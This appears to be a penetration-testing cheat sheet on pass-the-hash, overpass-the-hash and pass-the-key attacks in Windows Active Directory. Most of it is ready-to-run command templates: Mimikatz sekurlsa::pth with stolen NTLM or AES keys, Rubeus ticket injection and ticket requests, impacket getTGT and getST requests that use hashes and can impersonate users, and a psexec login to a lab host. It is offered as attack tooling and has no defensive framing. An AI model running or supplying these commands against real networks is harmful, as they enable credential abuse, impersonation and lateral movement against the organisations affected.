# Pass The Hash
You have a name and a hash? You can use the secret as authentication for the domain or other services. You can also request a Kerberos TGT or ST. This could be especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.

*Pass The Key:* DES, AES-128, AES-256 hash to obtain Kerberos tickets 
*Overpass The Hash:* NT hash to obtain Kerberos tickets

Requirements:
* User name
* A secret (password or hash) of the target user account

## Use key
`Sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH>`
`Sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<AES256 KEY>`
`Rubeus.exe ptt /ticket:<BASE64/FILE.KIRBI>`

`python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass`

## Get kerberos tickets 
#### Remote
`impacket-getTGT -dc-ip <IP> <DOMAIN>/<USER> -hashes :<HASH>`
`impacket-getST -spn <SERVICE> -dc-ip <IP> <DOMAIN>/<USER> -hashes :<HASH>`
impacket-getST can also impersonate someone if the user has impersonate set.

#### Local
`Rubeus.exe asktgt /user:<USER> /password:<PASS>`
`Rubeus.exe asktgs /ticket:<BASE64/FILE.KIRBI> /service:<SPN>`